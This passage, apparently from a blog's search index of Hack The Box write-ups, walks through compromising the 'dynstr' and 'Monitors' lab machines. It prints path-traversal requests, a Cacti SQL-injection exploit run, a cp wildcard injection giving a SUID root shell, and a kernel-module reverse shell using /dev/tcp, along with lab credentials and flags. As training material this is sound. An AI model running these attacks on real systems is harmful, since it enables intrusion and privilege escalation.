needed another key, which is at /etc/bind/infra.key (similar to the one used in the previous PHP file). This one is needed to use nsupdate (some nsupdate examples can be found here):\nwww-data@dynstr:/var/www/html/nic$ cat /etc/bind/infra.key key \"infra-key\" { algorithm hmac-sha256; secret \"7qHH/eYXorN2ZNUM1dpLie5BmVstOw55LgEeacJZsao=\"; }; www-data@dynstr:/var/www/html/nic$ nsupdate -k /etc/bind/infra.key \u0026gt; update add asdf.infra.dyna.htb 86400 A 10.10.17.44  \u0026gt; update add 44.17.10.10.in-addr.arpa 86400 PTR asdf.infra.dyna.htb \u0026gt; send \u0026gt; quit  We can check it with dig:\n$ dig asdf.infra.dyna.htb @10.10.10.244 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.10.6 \u0026lt;\u0026lt;\u0026gt;\u0026gt; asdf.infra.dyna.htb @10.10.10.244 ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 60663 ;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; WARNING: recursion requested but not available ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ;; QUESTION SECTION: ;asdf.infra.dyna.htb. IN A ;; ANSWER SECTION: asdf.infra.dyna.htb. 86400 IN A 10.10.17.44 ;; Query time: 76 msec ;; SERVER: 10.10.10.244#53(10.10.10.244) ;; WHEN: ... ;; MSG SIZE rcvd: 62  Lateral movement to user bindmgr Now we can login as bindmgr.\n$ ssh -i id_rsa bindmgr@10.10.10.244 bindmgr@dynstr:~$ cat user.txt 065011ea147bed677a2c49b904ef467c  This user can run a Bash script as root without password:\nbindmgr@dynstr:~$ sudo -l sudo: unable to resolve host dynstr.dyna.htb: Name or service not known Matching Defaults entries for bindmgr on dynstr: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User bindmgr may run the following commands on dynstr: (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh bindmgr@dynstr:~$ cat /usr/local/bin/bindmgr.sh  Here is the content of the script:\n#!/usr/bin/bash # This script generates named.conf.bindmgr to workaround the problem # that bind/named can only include single files but no directories. # # It creates a named.conf.bindmgr file in /etc/bind that can be included # from named.conf.local (or others) and will include all files from the # directory /etc/bin/named.bindmgr. # # NOTE: The script is work in progress. For now bind is not including # named.conf.bindmgr. # # TODO: Currently the script is only adding files to the directory but # not deleting them. As we generate the listof files to be included # from the source directory they won't be included anyway. BINDMGR_CONF=/etc/bind/named.conf.bindmgr BINDMGR_DIR=/etc/bind/named.bindmgr indent() { sed 's/^/ /';} # Check versioning (.version) echo\"[+] Running $0to stage new configuration from $PWD.\" if[[ !-f.version ]] ;then echo\"[-] ERROR: Check versioning. Exiting.\" exit42 fi if[[ \"`cat .version 2\u0026gt;/dev/null`\"-le\"`cat $BINDMGR_DIR/.version 2\u0026gt;/dev/null`\"]] ;then echo\"[-] ERROR: Check versioning. Exiting.\" exit43 fi # Create config file that includes all files from named.bindmgr. echo\"[+] Creating $BINDMGR_CONFfile.\" printf'// Automatically generated file. Do not modify manually.\\n'\u0026gt;$BINDMGR_CONF forfile in*;do printf'include \"/etc/bind/named.bindmgr/%s\";\\n'\"$file\"\u0026gt;\u0026gt;$BINDMGR_CONF done # Stage new version of configuration files. echo\"[+] Staging files to $BINDMGR_DIR.\" cp .version */etc/bind/named.bindmgr/ # Check generated configuration with named-checkconf. echo\"[+] Checking staged configuration.\" named-checkconf $BINDMGR_CONF \u0026gt;/dev/null if[[ $? -ne0 ]] ;then echo\"[-] ERROR: The generated configuration is not valid. Please fix following errors: \" named-checkconf $BINDMGR_CONF 2\u0026gt;\u0026amp;1|indent exit44 else echo\"[+] Configuration successfully staged.\" # *** TODO *** Uncomment restart once we are live. # systemctl restart bind9 if[[ $? -ne0 ]] ;then echo\"[-] Restart of bind9 via systemctl failed. Pleasecheck logfile: \" systemctl status bind9 else echo\"[+] Restart of bind9 via systemctl succeeded.\" fi fi  Privilege escalation The key point to notice in the Bash script is:\ncp .version */etc/bind/named.bindmgr/  The idea is to take the bash binary file, change its mode to SUID and then use cp --preserve=mode, so that it is copied by root into /etc/bind/named.bindmgr as SUID.\nThe use of the wildcard (*) let\u0026rsquo;s us create a file called '--preserve=mode', so that it is used in the cp command, not as a file but as a parameter.\nHere it is the process (we need a .version file to pass the first two if statements):\nbindmgr@dynstr:~$ cd /tmp bindmgr@dynstr:/tmp$ echo '2' \u0026gt; .version bindmgr@dynstr:/tmp$ cp $(which bash) . bindmgr@dynstr:/tmp$ chmod 4755 bash bindmgr@dynstr:/tmp$ echo \u0026gt; --preserve=mode bindmgr@dynstr:/tmp$ ls -la | grep bindmgr -rwsr-xr-x 1 bindmgr bindmgr 1183448 Jul 17 16:56 bash -rw-rw-r-- 1 bindmgr bindmgr 1 Jul 17 16:56 --preserve=mode -rw-rw-r-- 1 bindmgr bindmgr 2 Jul 17 16:56 .version bindmgr@dynstr:/tmp$ sudo /usr/local/bin/bindmgr.sh sudo: unable to resolve host dynstr.dyna.htb: Name or service not known [+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /tmp. [+] Creating /etc/bind/named.conf.bindmgr file. [+] Staging files to /etc/bind/named.bindmgr. cp: -r not specified; omitting directory 'systemd-private-3676061894b9497587b13254f655c27f-apache2.service-z1Nejh' cp: -r not specified; omitting directory 'systemd-private-3676061894b9497587b13254f655c27f-systemd-logind.service-Hse6sg' cp: -r not specified; omitting directory 'systemd-private-3676061894b9497587b13254f655c27f-systemd-resolved.service-r4Vptf' cp: -r not specified; omitting directory 'systemd-private-3676061894b9497587b13254f655c27f-systemd-timesyncd.service-omMmHi' cp: -r not specified; omitting directory 'vmware-root_495-2126330929' [+] Checking staged configuration. [-] ERROR: The generated configuration is not valid. Please fix following errors: /etc/bind/named.bindmgr/bash:1: unknown option 'ELF...' /etc/bind/named.bindmgr/bash:14: unknown option 'hȀE' /etc/bind/named.bindmgr/bash:40: unknown option 'YF' /etc/bind/named.bindmgr/bash:40: unexpected token near '}'  Now we have bash as a SUID binary, wo we can run it as root:\nbindmgr@dynstr:/tmp$ ls -la /etc/bind/named.bindmgr/ total 1168 drwxr-sr-x 2 root bind 4096 Jul 17 16:56 . drwxr-sr-x 3 root bind 4096 Jul 17 16:56 .. -rwsr-xr-x 1 root bind 1183448 Jul 17 16:56 bash -rw-rw-r-- 1 root bind 2 Jul 17 16:56 .version bindmgr@dynstr:/tmp$ /etc/bind/named.bindmgr/bash -p bash-5.0# cat /root/root.txt a098dde8b9b9849be538b1de060156a2  ","image":"/images/HTB/dynstr/dynstr.png","permalink":"https://7rocky.github.io/en/htb/dynstr/","section":"htb","summary":"Hack The Box. Linux. Medium machine. This machine uses a dynamic DNS service vulnerable to command injection and then the machine has sudo permissions for a command that uses a wildard. DNS knowledge, command injection techniques and wildcard abusing skills are needed to compromise this machine","time":10,"title":"dynstr"},{"contents":"  OS: Linux   Difficulty: Hard   IP Address: 10.10.10.238   Release: 24 / 04 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.10.238 -p 22,80 Nmap scan report for 10.10.10.238 Host is up (0.044s latency).  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA) | 256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA) |_ 256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=iso-8859-1). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 11.43 seconds This machine has ports 22 (SSH) and 80 (HTTP) open.\nWeb enumeration Accessing directly to http://10.10.10.238/ results in an error:\n$ curl http://10.10.10.238/ Sorry, direct IP access is not allowed. \u0026lt;br\u0026gt;\u0026lt;br\u0026gt;If you are having issues accessing the site then contact the website administrator: admin@monitors.htb We need to put monitors.htb into /etc/hosts. There is a Wordpress site in port 80 (using virtual hosts, as IP requests are blocked):\nTo enumerate the Wordpress site, we could have used wpscan. However, we can list plugins going to /wp-content/plugins, because there is a directory listing vulnerability:\nWe can search if there is a vulnerability involving the wp-with-spritz plugin. This plugin has Directory Path Traversal and Remote File Inclusion (RFI) vulnerabilities:\n$ searchsploit spritz ------------------------------------------------------------- -----------------------  Exploit Title | Path ------------------------------------------------------------- -----------------------  WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion | php/webapps/44544.php ------------------------------------------------------------- ----------------------- Shellcodes: No Results $ cat 44544.php # Exploit Title: WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion # Date: 2018-04-25 # Exploit Author: Wadeek # Software Link: https://downloads.wordpress.org/plugin/wp-with-spritz.zip # Software Version: 1.0 # Google Dork: intitle:(\u0026#34;Spritz Login Success\u0026#34;) AND inurl:(\u0026#34;wp-with-spritz/wp.spritz.login.success.html\u0026#34;) # Tested on: Apache2 with PHP 7 on Linux # Category: webapps   1. Version Disclosure  /wp-content/plugins/wp-with-spritz/readme.txt  2. Source Code  if(isset($_GET[\u0026#39;url\u0026#39;])){ $content=file_get_contents($_GET[\u0026#39;url\u0026#39;]);  3. Proof of Concept  /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http(s)://domain/exec Exploiting Wordpress Spritz plugin Now, we are able to read files from the server exploiting Directory Path Traversal. For example, /etc/passwd:\n$ curl \u0026#39;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/passwd\u0026#39; root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin sshd:x:110:65534::/run/sshd:/usr/sbin/nologin marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash Debian-snmp:x:112:115::/var/lib/snmp:/bin/false mysql:x:109:114:MySQL Server,,,:/nonexistent:/bin/false We can try to read the Wordpress configuration and search for credentials to the machine or to a database. There is a database password in wp-config.php:\n$ curl \u0026#39;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/var/www/wordpress/wp-config.php\u0026#39; \u0026lt;?php /** ... */  // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define( \u0026#39;DB_NAME\u0026#39;, \u0026#39;wordpress\u0026#39; );  /** MySQL database username */ define( \u0026#39;DB_USER\u0026#39;, \u0026#39;wpadmin\u0026#39; );  /** MySQL database password */ define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;BestAdministrator@2020!\u0026#39; );  /** MySQL hostname */ define( \u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39; );  /** Database Charset to use in creating database tables. */ define( \u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8mb4\u0026#39; );  /** The Database Collate type. Don\u0026#39;t change this if in doubt. */ define( \u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39; );  // ...  require_once ABSPATH . \u0026#39;wp-settings.php\u0026#39;; However, that password is not reused for SSH. Notice that PHP files are not interpreted, so the server is not vulnerable to Log Poisoning.\nSo, we can try to read the Apache configuration and look for the virtual host settings, searching for /etc/apache2/sites-enabled/000-default.conf:\n$ curl \u0026#39;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/apache2/sites-enabled/000-default.conf\u0026#39; # Default virtual host settings # Add monitors.htb.conf # Add cacti-admin.monitors.htb.conf  \u0026lt;VirtualHost *:80\u0026gt; \t# ... \t#ServerName www.example.com  \tServerAdmin admin@monitors.htb \tDocumentRoot /var/www/html \tRedirect 403 / \tErrorDocument 403 \u0026#34;Sorry, direct IP access is not allowed. \u0026lt;br\u0026gt;\u0026lt;br\u0026gt;If you are having issues accessing the site then contact the website administrator: admin@monitors.htb\u0026#34; \tUseCanonicalName Off \t# ... \t#LogLevel info ssl:warn  \tErrorLog ${APACHE_LOG_DIR}/error.log \tCustomLog ${APACHE_LOG_DIR}/access.log combined  \t# ... \t#Include conf-available/serve-cgi-bin.conf \u0026lt;/VirtualHost\u0026gt;  # vim: syntax=apache ts=4 sw=4 sts=4 sr noet Exploiting Cacti There is indeed another subdomain called cacti-admin.monitors.htb:\nThis is an administrator panel protected with username and password. Using admin:BestAdministrator@2020!, previously found, the access to the panel is granted:\nThe website is using Cacti Version 1.2.12, which is vulnerable to SQL injection:\n$ searchsploit cacti 1.2.12 --------------------------------------------------------------- ----------------------  Exploit Title | Path --------------------------------------------------------------- ----------------------  Cacti 1.2.12 - \u0026#39;filter\u0026#39; SQL Injection / Remote Code Execution | php/webapps/49810.py --------------------------------------------------------------- ---------------------- Shellcodes: No Results We can use this exploit to gain access to the machine as user www-data:\n$ python3 49810.py -t http://cacti-admin.monitors.htb -u admin -p \u0026#39;BestAdministrator@2020!\u0026#39; --lhost 10.10.17.44 --lport 4444 [+] Connecting to the server... [+] Retrieving CSRF token... [+] Got CSRF token: sid:ab28037201e7a3e0416ab797984a3b7613f1d680,1625401332 [+] Trying to log in... [+] Successfully logged in! [+] SQL Injection: \u0026#34;name\u0026#34;,\u0026#34;hex\u0026#34; \u0026#34;\u0026#34;,\u0026#34;\u0026#34; \u0026#34;admin\u0026#34;,\u0026#34;$2y$10$TycpbAes3hYvzsbRxUEbc.dTqT0MdgVipJNBYu8b7rUlmB8zn8JwK\u0026#34; \u0026#34;guest\u0026#34;,\u0026#34;43e9a4ab75570f5b\u0026#34; [+] Check your nc listener! $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.238. Ncat: Connection from 10.10.10.238:58344. /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ script /dev/null -c bash Script started, file is /dev/null www-data@monitors:/usr/share/cacti/cacti$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444  reset xterm www-data@monitors:/usr/share/cacti/cacti$ export TERM=xterm www-data@monitors:/usr/share/cacti/cacti$ export SHELL=bash www-data@monitors:/usr/share/cacti/cacti$ stty rows 50 columns 158 Foothold on the machine Once connected to the machine, we can access MySQL database to check for credentials, and we find the password hash for admin, but it is neither crackable with hashcat nor john.\nwww-data@monitors:/tmp$ mysql -u wpadmin -p Enter password: ... mysql\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | wordpress | +--------------------+ 2 rows in set (0.01 sec) mysql\u0026gt; use wordpress; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql\u0026gt; show tables; +-----------------------+ | Tables_in_wordpress | +-----------------------+ | ... | | wp_users | +-----------------------+ 12 rows in set (0.00 sec) mysql\u0026gt; describe wp_users; +--------------+---------------------+------+-----+---------+----------------+ | Field | Type | Null | Key | Default | Extra | +--------------+---------------------+------+-----+---------+----------------+ | ID | bigint(20) unsigned | NO | PRI | NULL | auto_increment | | user_login | varchar(60) | NO | MUL | | | | user_pass | varchar(255) | NO | | | | | ... | ... | ... | ... | ... | ... | +--------------+---------------------+------+-----+---------+----------------+ 10 rows in set (0.00 sec) mysql\u0026gt; select user_login, user_pass from wp_users; +------------+------------------------------------+ | user_login | user_pass | +------------+------------------------------------+ | admin | $P$Be7cx.OsLozVI5L6DD60LLZNoHW9dZ0 | +------------+------------------------------------+ 1 row in set (0.00 sec) Using ifconfig we see that the machine has Docker containers running, because there is a subnet called docker0:\nwww-data@monitors:/usr/share/cacti/cacti$ ifconfig ... docker0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500  inet 172.17.0.1 netmask 255.255.0.0 broadcast 172.17.255.255  inet6 fe80::42:3dff:fee9:d62f prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt;  ether 02:42:3d:e9:d6:2f txqueuelen 0 (Ethernet)  RX packets 2637 bytes 192831 (192.8 KB)  RX errors 0 dropped 0 overruns 0 frame 0  TX packets 4213 bytes 3273053 (3.2 MB)  TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 ens160: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500  inet 10.10.10.238 netmask 255.255.255.0 broadcast 10.10.10.255  inet6 fe80::250:56ff:feb9:d51b prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt;  inet6 dead:beef::250:56ff:feb9:d51b prefixlen 64 scopeid 0x0\u0026lt;global\u0026gt;  ether 00:50:56:b9:d5:1b txqueuelen 1000 (Ethernet)  RX packets 18062 bytes 7956984 (7.9 MB)  RX errors 0 dropped 70 overruns 0 frame 0  TX packets 7700 bytes 4809781 (4.8 MB)  TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 ... Analyzing the Docker container Actually, there is a Docker container at 172.17.0.2. We can transfer the nmap binary file to the machine to do a port scanning on the machine and on the container.\nAs the machine has nc, it can be used to transfer the file:\n$ nc 10.10.10.238 1234 \u0026lt; $(which nmap) www-data@monitors:/usr/share/cacti/cacti$ cd /tmp www-data@monitors:/tmp$ which nc /bin/nc www-data@monitors:/tmp$ nc -nlvp 1234 \u0026gt; .nmap Listening on [0.0.0.0] (family 0, port 1234) Connection from 10.10.17.44 64550 received! www-data@monitors:/tmp$ chmod +x .nmap www-data@monitors:/tmp$ ./.nmap -p- localhost Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-07-03 19:12 UTC Unable to find nmap-services! Resorting to /etc/services Cannot find nmap-payloads. UDP payloads are disabled. Nmap scan report for localhost (127.0.0.1) Host is up (0.000078s latency). Not shown: 65528 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 3306/tcp open mysql 4444/tcp open unknown 8080/tcp open http-alt 8443/tcp open unknown 9988/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds www-data@monitors:/tmp$ ./nmap -p- 172.17.0.2 Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-07-03 19:13 UTC Unable to find nmap-services! Resorting to /etc/services Cannot find nmap-payloads. UDP payloads are disabled. Nmap scan report for 172.17.0.2 Host is up (0.00014s latency). Not shown: 65532 closed ports PORT STATE SERVICE 8080/tcp open http-alt 8443/tcp open unknown 38279/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 1.37 seconds Now, we can use chisel to do a port forwarding and access the web server at the container from the attacker machine:\n$ nc 10.10.10.238 1234 \u0026lt; chisel $ ./chisel server -p 1337 --reverse server: Reverse tunnelling enabled server: Fingerprint lEVau5AqQ5yJn+cIJcdKHCOmSYVFY67kTuCt1JtmjtY= server: Listening on http://0.0.0.0:1337 server: session#1: tun: proxy#R:8443=\u0026gt;8443: Listening www-data@monitors:/tmp$ nc -nlvp 1234 \u0026gt; .chisel Listening on [0.0.0.0] (family 0, port 1234) Connection from 10.10.17.44 64550 received! www-data@monitors:/tmp$ chmod +x .chisel www-data@monitors.htb:/tmp$ ./.chisel client 10.10.17.44:1337 R:8443:172.17.0.2:8443 client: Connecting to ws://10.10.17.44:1337 client: Connected (Latency 109.928393ms) The Docker container is running a web server at ports 8080 and 8443. We can use gobuster from the machine (transfering the binary file and the wordlist again with nc) and discover see some directories:\n$ gobuster dir -u https://127.0.0.1:8443 -k -w $WORDLISTS/directory-list-2.3-medium.txt -q /images (Status: 302) [Size: 0] [--\u0026gt; /images/] /content (Status: 302) [Size: 0] [--\u0026gt; /content/] /common (Status: 302) [Size: 0] [--\u0026gt; /common/] /catalog (Status: 302) [Size: 0] [--\u0026gt; /catalog/] /marketing (Status: 302) [Size: 0] [--\u0026gt; /marketing/] /ecommerce (Status: 302) [Size: 0] [--\u0026gt; /ecommerce/] /ap (Status: 302) [Size: 0] [--\u0026gt; /ap/] /ar (Status: 302) [Size: 0] [--\u0026gt; /ar/] /ebay (Status: 302) [Size: 0] [--\u0026gt; /ebay/] /manufacturing (Status: 302) [Size: 0] [--\u0026gt; /manufacturing/] /passport (Status: 302) [Size: 0] [--\u0026gt; /passport/] /example (Status: 302) [Size: 0] [--\u0026gt; /example/] /bi (Status: 302) [Size: 0] [--\u0026gt; /bi/] /accounting (Status: 302) [Size: 0] [--\u0026gt; /accounting/] /webtools (Status: 302) [Size: 0] [--\u0026gt; /webtools/] /tomahawk (Status: 302) [Size: 0] [--\u0026gt; /tomahawk/] /facility (Status: 302) [Size: 0] [--\u0026gt; /facility/] /myportal (Status: 302) [Size: 0] [--\u0026gt; /myportal/] /sfa (Status: 302) [Size: 0] [--\u0026gt; /sfa/] ... This server is running Apache OFBiz 17.12.01:\nThe following response is weird, but the shown credentials are not valid.\n$ curl https://localhost:8443/webtools/control/main -k \u0026lt;!-- ... --\u0026gt; \u0026lt;div class=\u0026#34;screenlet-body\u0026#34;\u0026gt;  \u0026lt;div\u0026gt;For something interesting make sure you are logged in, try username: admin, password: ofbiz.\u0026lt;/div\u0026gt;  \u0026lt;br /\u0026gt;  \u0026lt;div\u0026gt;NOTE: If you have not already run the installation data loading script, from the ofbiz home directory run \u0026amp;quot;gradlew loadAll\u0026amp;quot; or \u0026amp;quot;java -jar build\u0026amp;#x2f;libs\u0026amp;#x2f;ofbiz.jar -l\u0026amp;quot;\u0026lt;/div\u0026gt;  \u0026lt;br /\u0026gt;  \u0026lt;div\u0026gt;\u0026lt;a href=\u0026#34;https://localhost:8443/webtools/control/checkLogin\u0026#34;\u0026gt;Login\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- ... --\u0026gt; Exploiting OFBiz Searching on the Internet for exploits, we can find this GitHub repository: CVE-2020-9496 containing a Proof of Concept (PoC) for exploiting unsafe Java deserialization through XML-RPC in OFBiz 17.12.01 using ysoserial.\nFor convenience, the shown PoC was rewritten into a Bash script called deserialization.sh to execute it easier (detailed explanation here).\nWe need to create a simple web server using Python to serve a file containing a reverse shell command:\n$ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ... And a nc listener, we gain access to the Docker container. Then we run the script:\n$ bash deserialization.sh 10.10.17.44 4444 ./ysoserial.jar And get the connection:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.238. Ncat: Connection from 10.10.10.238:53352. bash: cannot set terminal process group (31): Inappropriate ioctl for device bash: no job control in this shell root@ed0b91ea1876:/usr/src/apache-ofbiz-17.12.01# script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null root@ed0b91ea1876:/usr/src/apache-ofbiz-17.12.01# ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444  reset xterm root@ed0b91ea1876:/usr/src/apache-ofbiz-17.12.01# export TERM=xterm root@ed0b91ea1876:/usr/src/apache-ofbiz-17.12.01# export SHELL=bash root@ed0b91ea1876:/usr/src/apache-ofbiz-17.12.01# stty rows 50 columns 158 Escaping from the Docker container The next step is to perform a Docker container escape. This container has CAP_SYS_MODULE capability enabled, so as explained in HackTricks:\n The container has SYS_MODULE capability. As a result, the container can insert/remove kernel modules in/from the kernel of the Docker host machine.\n root@4e5701e892a5:/tmp# capsh --print Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap Securebits: 00/0x0/1\u0026#39;b0  secure-noroot: no (unlocked)  secure-no-suid-fixup: no (unlocked)  secure-keep-caps: no (unlocked) uid=0(root) gid=0(root) groups= Following the article, we can create the following reverse.c and Makefile archives and transfer them to the Docker container (first to the machine using nc and then exposing an HTTP server in the machine and using curl from the container). We also need to transfer the nc binary file from the machine to the container.\nreverse.c:\n#include \u0026lt;linux/kmod.h\u0026gt;#include \u0026lt;linux/module.h\u0026gt; MODULE_LICENSE(\u0026#34;GPL\u0026#34;); MODULE_AUTHOR(\u0026#34;AttackDefense\u0026#34;); MODULE_DESCRIPTION(\u0026#34;LKM reverse shell module\u0026#34;); MODULE_VERSION(\u0026#34;1.0\u0026#34;);  char* argv[] = { \u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/172.17.0.2/4444 0\u0026gt;\u0026amp;1\u0026#34;, NULL }; static char* envp[] = { \u0026#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34;, NULL };  static int __init reverse_shell_init() {  return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC); }  static void __exit reverse_shell_exit() {  printk(KERN_INFO \u0026#34;Exiting\\n\u0026#34;); }  module_init(reverse_shell_init); module_exit(reverse_shell_exit); Makefile:\nobj-m +=reverse.o all: \tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules clean: \tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean Now, we transfer the files to build the kernel module:\nroot@4e5701e892a5:/tmp# curl 10.10.10.238:8000/nc -so .nc root@4e5701e892a5:/tmp# curl 10.10.10.238:8000/reverse.c -so reverse.c root@4e5701e892a5:/tmp# curl 10.10.10.238:8000/Makefile -so Makefile root@4e5701e892a5:/tmp# chmod +x .nc root@4e5701e892a5:/tmp# ./.nc -nlvp 4444 Listening on [0.0.0.0] (family 0, port 4444) Next, we build the kernel module and run it (while listening with nc):\nroot@4e5701e892a5:/tmp# make make -C /lib/modules/4.15.0-142-generic/build M=/tmp modules make[1]: Entering directory \u0026#39;/usr/src/linux-headers-4.15.0-142-generic\u0026#39;  CC [M] /tmp/reverse.o  Building modules, stage 2.  MODPOST 1 modules  CC /tmp/reverse.mod.o  LD [M] /tmp/reverse.ko make[1]: Leaving directory \u0026#39;/usr/src/linux-headers-4.15.0-142-generic\u0026#39; root@4e5701e892a5:/tmp# insmod reverse.ko And finally get the two flags:\nroot@4e5701e892a5:/tmp# ./.nc -nlvp 4444 Listening on [0.0.0.0] (family 0, port 4444) Connection from 172.17.0.1 40912 received! bash: cannot set terminal process group (-1): Inappropriate ioctl for device bash: no job control in this shell root@monitors:/# cat /home/marcus/user.txt efecb015501176da1d8423d3843cfd6b root@monitors:/# cat /root/root.txt 5650dab3b397032cb92cd8c859e069d1 Intended way to own user.txt There was no need to get user.txt before root.txt. To get user.txt it was needed to find a Bash script inside the /home/marcus/.backup directory:\nwww-data@monitors:/home/marcus$ ls -la total 40 drwxr-xr-x 5 marcus marcus 4096 Jan 25 15:39 . drwxr-xr-x 3 root root 4096 Nov 10 2020 .. d--x--x--x 2 marcus marcus 4096 Nov 10 2020 .backup lrwxrwxrwx 1 root root 9 Nov 10 2020 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 marcus marcus 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 marcus marcus 3771 Apr 4 2018 .bashrc drwx------ 2 marcus marcus 4096 Jan 25 15:39 .cache drwx------ 3 marcus marcus 4096 Nov 10 2020 .gnupg -rw-r--r-- 1 marcus marcus 807 Apr 4 2018 .profile -r--r----- 1 root marcus 84 Jan 25 14:59 note.txt -r--r----- 1 root marcus 33 Jul 4 12:16 user.txt Since the directory has only x permissions, files inside could only be read if the full filename is provided. As the directory is called .backup, the files inside could be guessed 